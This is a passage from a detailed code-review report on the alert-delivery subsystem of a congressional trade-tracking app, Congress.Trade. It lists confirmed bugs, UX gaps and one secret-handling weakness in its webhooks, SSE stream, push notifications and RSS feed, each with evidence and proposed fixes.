- **Where:** app/src/client/routes.ts:449-495; app/src/client/state.ts:42; app/src/ui/dashboardHtml.ts:7046-7048; clients/ios/CongressTrade/APIClient.swift:748-749  ·  **Surface:** Cross-surface  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Since the inline-execution change, the normal (fast) create_subscription path returns a terminal command with the secret redacted and neither client performs the GET /commands/:id that would claim it.  The user sees 'Created.' with no secret and no stream URL; the secret sits unclaimed in result_secret.  SSE subscriptions are unusable (the stream needs the token) and webhook subscribers cannot verify X-CT-Signature.  Only the rare >INLINE_COMMAND_BUDGET_MS / 202 path still shows the credential.
- **Impact:** Every Premium user creating a delivery on web or iOS gets an unusable SSE subscription or an unverifiable webhook, and burns one of their 2 quota slots.  Marketing ('secrets are shown once at creation') is false in the common path.
- **Fix:** Server: when POST /commands finishes inline with status succeeded for create_subscription, claim result_secret in the same request and return it merged (mergeClaimedSecret) — it is the first owner-authenticated read.  Clients (belt and braces): after a 200 succeeded POST for create_subscription, perform one GET /commands/:id before rendering.  Add a routes.test that asserts the inline 200 body contains `subscription.secret` exactly once and the later GET is redacted.
- **Evidence:** app/src/client/routes.ts:467-483 executes inline then returns `c.json({ command: settled }, terminal ? 200 : 202)` where `settled = await getCommand(...)`; client/state.ts:42-43 COMMAND_COLS selects `id, user_id, type, status, idempotency_key, payload, result, error, created_at, updated_at, started_at, finished_at` — no result_secret column exists in this query at all. commands.ts:98-110 splitCommandResult stores the secret only in the separate result_secret column (via updateCommandStatus's resultSecret param, commands.ts:393-396). Only client/routes.ts:353-370 GET /commands/:id claims it (`claimCommandResultSecret` + `mergeClaimedSecret`). Web: dashboardHtml.ts:6767-6788 `pollCmd` only fires when `data.command.status === 'queued' || 'running'`; a terminal 200 skips straight to `renderResult(data)` (line 6790) with the redacted result. iOS: APIClient.swift:632-637 `postCommand` only calls `awaitCommandResult` (the GET loop) when `response.command.status == .queued || .running`.
- **Panel:** delivery-alerts — Reproduced the full chain in code: COMMAND_COLS truly omits result_secret, the POST handler never calls the claim function, and both clients gate their GET-poll on queued/running status only.  This is the most severe finding in the set — it silently breaks the core paid feature end to end. · merged: api-contract/APICONTRACT-02 · `delivery-alerts/DELIVERYALERTS-01`

#### 15. [P1] Push alerts ignore watchlist / notificationSettings and Premium: every device gets every trade

- **Where:** app/src/delivery/apnsFanout.ts; clients/ios/CongressTrade/Views/Delivery/DeliveryView.swift  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** There is no per-user targeting, throttling, or digesting for pushes: a bulk publish sends up to 40 sounded notifications per minute to every device for as long as the backlog lasts, regardless of the user's watchlist or plan.
- **Impact:** Notification fatigue → users disable alerts or uninstall; contradicts the in-app promise that the watchlist narrows what you receive; Premium gating of alerts is undefined.
- **Fix:** Fan out per user: filter trades by that user's watchlist/notificationSettings, collapse per filing (one push 'N new trades from X'), cap pushes/user/hour, and decide/document whether push is free or Premium (enforce in fanout if Premium).
- **Evidence:** apnsFanout.ts:144 `listAllActiveApnsDevices(env)` then a per-trade `sendAll` to every device; grep confirms no reference to `notificationSettings` or `watchlist` anywhere under delivery/. client/commands.ts:232-234 comment literally says 'Actual trade push fan-out still requires Premium + APNs credentials when that path ships' — i.e. the author's own comment acknowledges entitlement is not enforced yet. commands.ts:149-150/190-191 do gate subscription creation/activation on isPremiumUserAsync, but that check is absent from apnsFanout.ts entirely.
- **Panel:** delivery-alerts — Confirmed the comment text verbatim and confirmed via grep that notificationSettings/watchlist have zero readers in delivery/. · merged: app-store-compliance/APPSTORECOMPLIANCE-20, growth-onboarding/GROWTHONBOARDING-03 · `delivery-alerts/DELIVERYALERTS-04`

#### 16. [P1] 'Review needed' operator pushes are fanned out to every end-user device

- **Where:** app/src/delivery/apnsFanout.ts  ·  **Surface:** iOS  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Internal extraction-review events (an admin workflow surfaced only in /?view=review) are pushed to all consumers' phones, including free users, with internal doc ids and raw extractor reasons.
- **Impact:** Spam and leakage of operator internals to paying customers; review bursts would wake every subscriber.
- **Fix:** Route review_needed pushes only to devices whose user has isAdmin (join users) or to a dedicated operator token list; keep consumer devices on official_trade only.
- **Evidence:** app/src/delivery/apnsFanout.ts:166-175 selects `review_queue WHERE resolved = 0`; 221-229 calls `sendAll({ title: 'Review needed', body: review.reason?.trim() || 'Filing ' + review.doc_id + ' needs review.', ... })`. `sendAll` (188-209) iterates `devices` = the full result of `listAllActiveApnsDevices(env)` (line 144) with no admin/role predicate — confirmed pushDevices.ts's listAllActiveApnsDevices selects `WHERE platform='apns' AND active=1` only, no user filter.
- **Panel:** delivery-alerts — sendAll is literally the same function object used for both trade and review pushes with the same unfiltered device list; confirmed no per-user or per-role gating exists anywhere in the fan-out path. · `delivery-alerts/DELIVERYALERTS-03`

#### 20. [P1] Quarantined deliveries are permanently dropped (57,321 as of 2026-08-19) while the alert says 'until the target recovers'

- **Where:** app/src/delivery/targetCircuit.ts  ·  **Surface:** Backend  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Quarantine is terminal: those events are never re-dispatched when the target recovers.  The cap is per-subscription (500 parked) so a few hours of outage or a backfill flood loses everything beyond 500.
- **Impact:** Silent data loss for paying webhook subscribers; the operator alert text promises recovery that does not happen; no user-visible signal.
- **Fix:** Either make quarantine recoverable (scheduled releaser when the circuit closes, oldest-first, bounded) or be honest: call it 'dropped', expose the count on the user's Delivery row, and raise/document the cap.  Also add an admin endpoint to requeue quarantined rows.
- **Evidence:** Live-reproduced 2026-08-19 via read-only admin GET (token redacted per protocol): `resourceGovernors.outbound` returns `parkedDeliveries: 500, quarantinedDeliveries: 57321` — same counts as the original capture, i.e. the number has not moved in a day, consistent with the claim that quarantined rows never get released. targetCircuit.ts: past `parkedCap` (500), the overflow row is set to `status='quarantined'` and an admin alert says 'Overflow deliveries are being quarantined until the target recovers.' `flushParkedDeliveries` only selects `d.status = 'parked'`; grep of the whole src tree for 'quarantined' shows the only other touch point is admin/routes.ts's read-only count query — no code path transitions a row out of 'quarantined'.
- **Panel:** delivery-alerts — Live count is unchanged a day later (57,321), which is itself evidence the rows are truly stuck rather than slowly draining.  Code-path grep confirms no releaser exists for 'quarantined' status. · `delivery-alerts/DELIVERYALERTS-07`

#### 28. [P1] Member filter accepts names on both clients but matching requires bioguide ids → silently delivers nothing

- **Where:** app/src/delivery/subscriptions.ts:397-401; app/src/ui/dashboardHtml.ts:3169  ·  **Surface:** Cross-surface  ·  **Category:** bug  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md I9)
- **What:** Typing 'Nancy Pelosi' creates a subscription whose members[] can never match any transaction; the row looks active ('2 members') and nothing is ever delivered.
- **Impact:** Silent zero-delivery for the most natural filter; the user blames reliability.
- **Fix:** Resolve names to bioguide ids at create/update time (reuse resolveMemberFilerId / /api/members roster), reject unresolvable names with a 400 listing them, and render resolved names in the Filters column. iOS: replace free text with MemberDirectorySearch picker.
- **Evidence:** dashboardHtml.ts:2990 `<input id=\"newMembers\" placeholder=\"members (names/ids, optional)\" title=\"Comma-separated filer ids or names\">`. Server: subscriptions.ts's `validateSubscriptionFilters` (members via the shared `strings()` helper) only trims/dedupes/length-checks — no id resolution. `matchesFilters` (subscriptions.ts ~398-401): `if (!tx.filerId || !filters.members.includes(tx.filerId)) return false;` where tx.filerId is a bioguide/filer id, not a display name. `resolveMemberFilerId` exists and is used only at rest.ts:634 and rest.ts:803 (the /transactions and /feed.xml read paths), never on the subscription create/update path.
- **Panel:** delivery-alerts — Confirmed the I9 citation verbatim in the prior-review doc ('Delivery member filter accepts free text that can never match — needs name→bioguide resolution via /api/members or remove field').  Code confirms zero name resolution anywhere on the subscription path. · merged: ios-shipped-app/IOSSHIPPEDAPP-52 · `delivery-alerts/DELIVERYALERTS-06`

#### 41. [P1] Web copy tells webhook consumers to dedupe on docId — that drops every trade after the first in a filing

- **Where:** app/src/ui/dashboardHtml.ts:3153  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The UI instruction contradicts the contract: a consumer following it would treat the 2nd..Nth transactions of a multi-trade filing as duplicates.
- **Impact:** Integrators lose most of the data in multi-trade filings (the norm).
- **Fix:** Change to 'dedupe on the transaction id (X-Tx-Id + X-Subscription-Id)'; also fix 'We POST the full filing JSON' (2963) / iOS 'we POST each new filing' to say each transaction.
- **Evidence:** dashboardHtml.ts:2974 'Secrets are shown once at creation; webhook consumers dedupe on <code>docId</code>.' Delivery is per transaction: webhook.ts:446-447 sets headers `X-Tx-Id` + `X-Subscription-Id` per POST; docs/webhook-signatures.md:51-52 documents 'Recipients must still dedupe on X-Subscription-Id + X-Tx-Id.' docId is the filing id shared by every transaction in a multi-trade filing.
- **Panel:** delivery-alerts — Confirmed the exact contradiction: UI copy says docId, code and docs both say X-Subscription-Id + X-Tx-Id. · `delivery-alerts/DELIVERYALERTS-09`

#### 42. [P1] SSE opened from the provided URL replays the entire history before going live

- **Where:** app/src/delivery/sse.ts  ·  **Surface:** Backend  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** First connection and every fresh reconnect streams the whole corpus before the live tail, instead of starting at 'now', unless the client itself tracks and resends Last-Event-ID/since.
- **Impact:** Unusable first-run experience, wasted D1 reads/egress, and consumers misclassify years-old rows as new (ties to -05).
- **Fix:** Default `since` to the current high-water mark (or the subscription's stored cursor) when absent; include `&since=<hwm>` in the generated streamUrl; keep explicit since=0 for intentional full replay.
- **Evidence:** sse.ts ~line 307 `let cursor = Number.isFinite(since) ? Number(since) : 0;` — confirmed the stored subscription cursor is not consulted here; the value only gets clamped DOWN to the high-water mark later (never up from 0). `client/utils.ts:165` and `delivery/rest.ts:182` build the streamUrl as `/api/stream?subscription=<id>&token=<secret>` with no `since` parameter. Live `/api/transactions` total is in the tens of thousands (89k+ at capture time, growing).
- **Panel:** delivery-alerts — Confirmed the default-to-0 behavior and the streamUrl generation omitting since in both server-side builders. · `delivery-alerts/DELIVERYALERTS-10`

#### 54. [P1] Delivery has no freshness gate: backfilled 2023–2024 trades are emitted as new webhook/SSE/RSS/push events

- **Where:** app/src/delivery/outbox.ts  ·  **Surface:** Backend  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Any transaction row insert (review resolution of an old filing, backfill, reprocessing) produces delivery events identical to a fresh filing.  Consumers cannot tell a 2023 trade from today's without their own logic, and the webhook payload (see -13) does not even carry filedDate.
- **Impact:** Alert subscribers act on stale trades; RSS 'Recent Trades' is dominated by years-old rows; the 57k quarantined deliveries suggest backfill floods drove the breaker.
- **Fix:** Stamp deliveries with an `isBackfill`/`freshness` flag computed from filing.first_seen_at/filed_date vs now, default subscriptions to fresh-only (e.g. filed or first-seen within 7 days) with an opt-in for history, and exclude old rows from APNs and the RSS default.
- **Evidence:** Live-reproduced 2026-08-19 (one day after capture): `curl /api/transactions?limit=200&order=desc` still returns cursorSeq 108944, txDate 2023-03-08, filedDate 2024-06-10, firstSeenAt 2026-08-10T02:20:00.468Z, createdAt 2026-08-19T00:49:12.983Z (Daniel Webster) among the 13 pre-2025 rows in the top 200 by cursor order — the exact record cited in the original finding, still present and still the same createdAt timestamp. app/src/extraction/normalizer.ts:428-435 flushes every inserted id to the outbox unconditionally (`if (insertedIds.length > 0) { await flushDeliveryOutbox(...) }`) with no age check against txDate/filedDate.
- **Panel:** delivery-alerts — Independently re-fetched live data a day after the original capture and got byte-identical evidence (same cursorSeq/timestamps), which also confirms the record has sat in the delivery pipeline unchanged, consistent with the claim that nothing re-processes or expires it. · `delivery-alerts/DELIVERYALERTS-05`

#### 75. [P2] Webhook retry horizon is ~75 seconds, not the 'retrying automatically' robustness implied

- **Where:** app/src/delivery/webhook.ts  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A receiver outage longer than about a minute exhausts all attempts for in-flight transactions; they become terminal failed rows that are never retried.  The circuit breaker then parks later rows, but the first ones are lost.
- **Impact:** Short deploys/restarts of a subscriber's endpoint lose events; contradicts the at-least-once promise.
- **Fix:** Use a real schedule (e.g. 1m, 5m, 30m, 2h, 12h) so MAX_BACKOFF_SEC matters, or hand terminal-failed rows to the parked path so the probe-success flush re-dispatches them; document the schedule in webhook-signatures.md.
- **Evidence:** webhook.ts:41-47 `MAX_ATTEMPTS = 5`, `BASE_BACKOFF_SEC = 5`, `MAX_BACKOFF_SEC = 900`; `backoffSeconds(attempt)` = `Math.max(1, Math.floor(Math.random() * Math.min(5*2**(attempt-1), 900)))` → attempts 1-4 wait up to 5/10/20/40s (sum ≤75s before the 5th and final attempt; the 900s cap is unreachable at MAX_ATTEMPTS=5). A row with `status='failed' && attempts >= MAX_ATTEMPTS` is treated as `outcome: 'delivered'` in the claim function (confirmed near line 561), i.e. terminal-failed rows are never retried again. Marketing: dashboardHtml.ts:2963 'We POST the full filing JSON to your URL the instant it lands, retrying automatically on failure.'
- **Panel:** delivery-alerts — Constants and claim-logic confirmed exactly; the 900s MAX_BACKOFF_SEC is indeed dead code given only 5 attempts. · `delivery-alerts/DELIVERYALERTS-08`

#### 76. [P2] Webhook payload omits politician name, chamber, party and filedDate (SSE replay has them)

- **Where:** app/src/delivery/webhook.ts  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-07-28 (X1 partially: signing doc exists, payload schema still undocumented)
- **What:** A webhook consumer must call back to resolve who traded (filerId → name), which chamber, and when it was filed; SSE clients see two different shapes depending on replay vs live.
- **Impact:** Integration friction; impossible to apply a freshness filter client-side without a second request.
- **Fix:** Build webhook + broadcast payloads with the same joined row as drainSseBacklog (filer name/state/party, chamber, filedDate, firstSeenAt, sourceUrl) and document the schema in openapi.yaml `webhooks:`.
- **Evidence:** webhook.ts:239 `const tx = mapTransaction(txRow)`; rows.ts's mapTransaction returns id/docId/filerId/txDate/assetName/ticker/amounts/etc but no fullName/chamber/party/filedDate/firstSeenAt fields at all. The extra `ctx` object built at webhook.ts:255-260 (chamber/sector/marketCapBucket) is broadcast separately as `context`, not merged into `tx` — fullName/party/filedDate/firstSeenAt remain absent from both the webhook body and the live BroadcastChannel tail (webhook.ts:265-276, consumed by sse.ts's live path). SSE's catch-up replay instead uses `mapFeedTransaction` (rows.ts:207+, sse.ts ~541) which is the ref-aware upgrade carrying fullName/state/party/filedDate/firstSeenAt/sourceUrl — so replay and live SSE events genuinely differ in shape.
- **Panel:** delivery-alerts — Confirmed mapTransaction vs mapFeedTransaction field sets directly in rows.ts, and confirmed webhook.ts's ctx object is broadcast as a sibling field, not merged into tx. · `delivery-alerts/DELIVERYALERTS-13`

#### 77. [P2] No test/ping delivery for a new webhook or SSE target

- **Where:** app/src/ui/dashboardHtml.ts (Delivery create form, ~3157-3200)  ·  **Surface:** Cross-surface  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-07-28 (X2)
- **What:** Users cannot validate URL reachability, HMAC verification, or the SSE token until a real filing lands.
- **Impact:** Setup failures are discovered late; support load.
- **Fix:** Add `POST /api/client/v1/commands {type:'test_subscription'}` that runs deliverToSubscription with a clearly marked `event:'test'` payload through the same signing/circuit path, and a 'Send test' button on web/iOS rows.
- **Evidence:** client/commands.ts's list of handled command types (create_subscription, update_subscription, delete_subscription, register_device, unregister_device) has no 'test'/'ping' type; grep of client/commands.ts and delivery/rest.ts for 'test_subscription' or similar returns nothing. The only delivery trigger is a real transaction via delivery_outbox.
- **Panel:** delivery-alerts — Confirmed the X2 citation exists verbatim in the prior review doc, and confirmed no test-delivery command type exists in current commands.ts. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-29 · `delivery-alerts/DELIVERYALERTS-14`

#### 121. [P2] Push notification title calls Exchange trades "bought"; body uses "feed"

- **Where:** app/src/delivery/apnsFanout.ts:121,131 (unchanged)  ·  **Surface:** Backend  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Every exchange (and any unknown-type) transaction is announced as a purchase in push titles.
- **Impact:** Factually wrong alert headline sent to subscribers' lock screens.
- **Fix:** Mirror rest.ts: B/P→bought, S→sold, else→traded; body "New official trade on Congress.Trade."
- **Evidence:** origin/main app/src/delivery/apnsFanout.ts:121 `const side = (row.tx_type ?? '').toUpperCase() === 'S' ? 'sold' : 'bought';` (any non-'S' value, including 'E' Exchange per app/src/shared/txType.ts:17/:88, becomes "bought"); the fanout SELECT (:154-160) does not filter tx_type; :131 `'New official trade is on the Congress.Trade feed.'`.  RSS handles it correctly (rest.ts:849 `… : 'traded'`).
- **Panel:** ux-copy — Code confirmed; 'E' is a real tx_type (shared/txType.ts) and the fanout query does not exclude it. · merged: delivery-alerts/DELIVERYALERTS-17 · `ux-copy/UXCOPY-31`

#### 159. [P2] No user-visible delivery health: failures, parks, quarantines and terminal errors are only emailed to the admin

- **Where:** app/src/delivery/rest.ts; app/src/ui/dashboardHtml.ts (subsTable Progress/Status columns)  ·  **Surface:** Cross-surface  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (W6 'no delivery-health visibility')
- **What:** A subscriber whose endpoint returns 401 for a week, or whose events are parked/quarantined, sees 'active' and nothing else.
- **Impact:** Silent failure of a paid feature; users cannot self-diagnose.
- **Fix:** Add per-subscription stats to GET /subscriptions (last delivered at, last error, failed/parked/quarantined counts, circuit state) and render a status chip + last error on both clients; optionally email the owner when a target circuit opens.
- **Evidence:** client/utils.ts's `publicSubscription` returns only id/delivery/targetUrl/filters/cursor/active/createdAt/hasSecret — no attempts/lastError/parked/quarantined counts. Failures are surfaced only via `notifyAdmin` calls in webhook.ts and targetCircuit.ts. iOS DeliveryView.swift's SubscriptionRow shows only 'Cursor N'.
- **Panel:** delivery-alerts — Confirmed publicSubscription's field list directly and confirmed the W6 citation in the prior review doc. · `delivery-alerts/DELIVERYALERTS-15`

#### 168. [P2] iOS Delivery creation still cannot set per-subscription tickers, sides or min amount (silently reuses the global watchlist)

- **Where:** CongressTradeStore.createDelivery / DeliveryView  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (ux-findings §8; 07-28 I9)
- **What:** ux-findings §8 Delivery parity item and 07-28 W6/I9 lineage.  Members field is still free text (parseMembers) with no name→id resolution.
- **Impact:** Premium iOS users get broader alerts than they asked for and can't express what web users can.
- **Fix:** Add tickers/sides/min-amount controls bound to SubscriptionFilters; resolve member names via /api/members search or a picker.
- **Evidence:** origin/main CongressTradeStore.swift `func createDelivery(mode: DeliveryMode, webhookURL: String, chambers: Set<ChamberFilter> = [], members: [String] = []) async { ... let filters = SubscriptionFilters(members: members.isEmpty ? nil : members, tickers: watchlist.isEmpty ? nil : watchlist, chambers: chambers.isEmpty ? nil : chambers.map(\.rawValue).sorted()) ...}` — no sides or minAmount parameter anywhere in the signature or SubscriptionFilters construction; tickers are hard-wired to the global watchlist, not a per-subscription list.
- **Panel:** prior-review-followup — Function signature and SubscriptionFilters construction quoted verbatim from origin/main confirm no sides/minAmount and watchlist-sourced tickers. · `prior-review-followup/PRIORREVIEWFOLLOWUP-20`

#### 222. [P3] Three different event names for one delivery (transaction.created / trade.new / congress.trade) and OpenAPI documents the wrong SSE event

- **Where:** app/src/delivery/webhook.ts:445; app/src/delivery/sse.ts:102; app/docs/openapi.yaml:168,189  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (X4 spec drift)
- **What:** Integrators reading the header, body, SSE frame and spec see four inconsistent names; the spec would make an EventSource listener for 'trade.new' receive nothing (the actual frame name is congress.trade).
- **Impact:** Integration bugs; doc drift.
- **Fix:** Pick `congress.trade` (the shared contract) everywhere, keep legacy fields only if documented as deprecated, and fix openapi.yaml + any stale route comments; add `webhooks:` to the spec and serve it.
- **Evidence:** webhook.ts:445 `'X-CT-Event': 'transaction.created'`; webhook.ts:405-406 payload uses `createCongressEvent('congress.trade', ...)` plus an added `event: 'trade.new'` field; sse.ts:102 `createCongressEvent('congress.trade', ...)` (SSE frame's event name is 'congress.trade'); app/docs/openapi.yaml:168,189 both describe /api/stream as '`trade.new` events'.
- **Panel:** delivery-alerts — Confirmed all four literal strings ('transaction.created', 'trade.new' ×2 locations, 'congress.trade' ×2 locations) exactly as cited. · `delivery-alerts/DELIVERYALERTS-18`

#### 223. [P3] Outbox broadcasts NEW_TRANSACTIONS but SSE only listens for NEW_TRANSACTION — dead code / confusing

- **Where:** app/src/delivery/outbox.ts  ·  **Surface:** Backend  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The outbox broadcast never reaches any listener; it costs a D1 read per flush and misleads readers into thinking SSE is pushed at outbox time.
- **Impact:** Wasted reads; maintenance confusion.
- **Fix:** Delete the outbox broadcast block or make sse.ts consume the plural message (ideally with the joined rows, see -13).
- **Evidence:** outbox.ts:170 posts `type: 'NEW_TRANSACTIONS'` (plural); sse.ts:377 checks `event.data?.type === 'NEW_TRANSACTION'` (singular) — the two never match. The working live-tail broadcast is instead webhook.ts's separate 'NEW_TRANSACTION' (singular) postMessage.
- **Panel:** delivery-alerts — Confirmed the singular/plural mismatch directly by grepping both literal strings. · `delivery-alerts/DELIVERYALERTS-19`

#### 224. [P3] Only 2 subscriptions per account with no quota shown until the 409

- **Where:** app/src/delivery/subscriptions.ts:20-21  ·  **Surface:** Cross-surface  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A paid account can hold at most two deliveries (e.g. one webhook + one SSE) and learns this only on failure.
- **Impact:** Cannot separate e.g. a 'senate NVDA' webhook from a 'house >$50k' webhook; surprising ceiling for $5/mo.
- **Fix:** Raise the cap (e.g. 10) or at least show 'N of 2 used' near Add New Delivery and in iOS Create Delivery.
- **Evidence:** subscriptions.ts:20-21 `MAX_SUBSCRIPTIONS_PER_USER = 2`, `MAX_ACTIVE_SUBSCRIPTIONS_PER_USER = 2`, throwing 'subscription limit reached (2 total)' on the 3rd create attempt (409). Web renders it only as 'Failed: subscription limit reached (2 total)' with no counter shown proactively anywhere in the create form markup.
- **Panel:** delivery-alerts — Confirmed the constants and error text directly.  Did not re-verify the specific claim that 'the owner's account already holds 2' (that detail comes from the admin /subscriptions endpoint's live data, which was not re-queried here to avoid unnecessary PII exposure) — the cap-of-2 mechanism itself, which is the load-bearing part of the finding, is confirmed. · `delivery-alerts/DELIVERYALERTS-21`

#### 225. [P3] RSS feed has no per-item filing link context and is sorted by discovery so backfills dominate 'Recent Trades'

- **Where:** app/src/delivery/rest.ts:827-900 (approx, unchanged region)  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The free RSS channel (the only free 'alert' surface) can show years-old trades as the newest items whenever a backfill or review-resolution batch runs, and always shows unformatted amounts with no chamber/party context.
- **Impact:** Makes the product look stale to RSS readers/aggregators during any backfill event.
- **Fix:** Apply the same freshness gate as -05 (default to filings first seen within 30 days), format amounts with the shared $k/$m helper, include chamber/party, and link to the trade drawer (`/?trade=<id>`) instead of the bare filing API.
- **Evidence:** rest.ts's /feed.xml handler sets `order: 'desc'` (cursor_seq / discovery order, not txDate/filedDate) and `pubDate = tx.firstSeenAt ?? tx.createdAt`; title = `${who} ${side} ${what}` and description = txDate/filedDate/asset/amount only — neither includes chamber or party. Amount is rendered raw as `Amount: ${amountMin}–${amountMax}` (e.g. '15001–50000') rather than a formatted $k/$m range. Live feed.xml fetched 2026-08-19 currently shows fresh same-day items at the top (a backfill batch is not active right now), but the sort key and pubDate source are confirmed to be discovery-based, not trade-date-based, which is the load-bearing part of the claim (ties directly to the reproduced -05 evidence of old rows still being freshly inserted).
- **Panel:** delivery-alerts — Live feed.xml today happens to show fresh items rather than the 2023-dated ones from the original capture, but the underlying sort/pubDate logic is confirmed code-level to be discovery-order, not trade-date-order — so the finding's mechanism, not just a point-in-time snapshot, is correct.  Softened the wording slightly to reflect that it's intermittent rather than a permanent 'dominates' state; the P3 severity is still appropriate given the confirmed mechanism. · merged: qa-bughunt/QABUGHUNT-23 · `delivery-alerts/DELIVERYALERTS-31`

#### 262. [P3] RSS channel link is http://, items link to house.gov PDFs instead of congress.trade permalinks, no self link

- **Where:** app/src/delivery/rest.ts:827-880  ·  **Surface:** Backend  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The feed sends every reader/aggregator click to the government PDF rather than the trade's page on congress.trade, uses a plaintext channel URL, and lacks the RSS best-practice self link.
- **Impact:** RSS syndication (IFTTT/Zapier/Feedly/newsletters) generates zero visits or backlinks to the site; some validators flag the missing self link; http link can be flagged as mixed content in readers.
- **Fix:** Hardcode `https://congress.trade`; set item link to `${SITE}/?trade=${tx.id}` (keep the PDF as an `<enclosure>`/description link); add `xmlns:atom` + `<atom:link href="https://congress.trade/api/feed.xml" rel="self" type="application/rss+xml"/>` and `lastBuildDate`.
- **Evidence:** Live feed 2026-08-19: `<link>http://congress.trade</link>` (channel) and every `<item><link>` is `https://disclosures-clerk.house.gov/public_disc/ptr-pdfs/...pdf`; no `<atom:link rel="self">`, no `lastBuildDate`. Code (origin/main app/src/delivery/rest.ts): :845 `const origin = new URL(c.req.url).origin;` (http behind the Cloudflare/Coolify proxy), :853 `const link = tx.sourceUrl ?? `${origin}/api/filings/…``, :876 channel `<link>${xmlEscape(origin)}</link>` (local HEAD cd30d4b9: :813/:820/:845).
- **Panel:** seo-social — Reproduced live; rest.ts line numbers restated for origin/main (the file moved by ~32 lines since local HEAD). · `seo-social/SEOSOCIAL-12`

#### 279. [P3] RSS item copy: raw bracket numbers ("Amount: 1001–15000", "50000001–?") and no $

- **Where:** app/src/delivery/rest.ts:860-861  ·  **Surface:** Backend  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The public RSS feed (linked from the footer) prints raw integers and a literal "?" for open brackets instead of the site's `$1k–$15k` / `$50m+` formatting.
- **Impact:** Feed readers see unformatted, ambiguous amounts.
- **Fix:** Reuse the bracket formatter (`$1k–$15k`, `$50m+`).
- **Evidence:** live `curl https://congress.trade/api/feed.xml` (2026-08-19): `<description>Trade date: 2023-03-08 · Filed: 2024-06-10 · Asset: U.S. Treasury I Bond · Amount: 1001–15000</description>`, `…Amount: 15001–50000`; origin/main app/src/delivery/rest.ts:861-862 `Amount: ${tx.amountMin ?? '?'}–${tx.amountMax ?? '?'}`.
- **Panel:** ux-copy — Reproduced live via curl. · `ux-copy/UXCOPY-30`

#### 313. [P3] iOS cannot edit an existing delivery (web can) and shows the raw 'Cursor N' internal

- **Where:** app/src/ui/dashboardHtml.ts:6761-6764 (fixed); clients/ios/CongressTrade/Views/Delivery/DeliveryView.swift:453 (still open, no edit action)  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** tracked-in-PR-#1973 (create-form parity); edit/cursor text new
- **What:** Parity gap plus meaningless internals on iOS rows.
- **Impact:** iOS users must delete/recreate (and lose the secret) to change filters.
- **Fix:** Add an Edit sheet using update_subscription; replace 'Cursor N' with a human progress/status line and a filters summary.
- **Evidence:** Repo-wide case-insensitive grep for 'edit' in DeliveryView.swift returns zero matches — only Pause/Resume + Delete actions exist on SubscriptionRow. `Text(\"Cursor \\(subscription.cursor)\")` confirmed at DeliveryView.swift:447. Web has an Edit action and a humanized 'Delivered through event #N' string (dashboardHtml.ts ~6474-6587).
- **Panel:** delivery-alerts — Confirmed both the total absence of edit affordance and the literal 'Cursor N' string at the exact cited line. · merged: ux-copy/UXCOPY-17 · `delivery-alerts/DELIVERYALERTS-22`

#### 365. [P3] Webhook signing secret doubles as the management credential and, for SSE, lives in a query string

- **Where:** app/src/delivery/subscriptions.ts; app/src/delivery/webhookTarget.ts  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** Whoever can read the verifier-side secret (or a proxy log of the SSE URL) can also redirect the webhook to another URL; users have no self-serve rotation short of delete+recreate.
- **Impact:** Blast radius of a leaked secret is larger than necessary.
- **Fix:** Split a `signing_secret` (HMAC) from a `management` capability (session-only for user rows), add a user-facing 'Rotate secret' command (one-time display, via the same claim path), and prefer an `sse_token` separate from the HMAC key.
- **Evidence:** The same secret authorizes PATCH /subscriptions/:id (target URL, filters, active, cursor changes) and signs webhooks, and SSE puts it in `?token=` in the streamUrl (client/utils.ts:165, delivery/rest.ts:182). `rotateSubscriptionSecret` is defined in subscriptions.ts and imported/used only in admin/routes.ts (~line 9780) — grep confirms it is never imported by client/commands.ts or delivery/rest.ts, so end users have no self-serve rotation.
- **Panel:** delivery-alerts — Confirmed rotateSubscriptionSecret's only importer is admin/routes.ts via grep. · `delivery-alerts/DELIVERYALERTS-20`

#### 366. [P3] iOS 'Trade Disclosure Alerts' shows 'on' with no way to choose what you get; web 'Push Notifications' card points to a feature that cannot deliver today

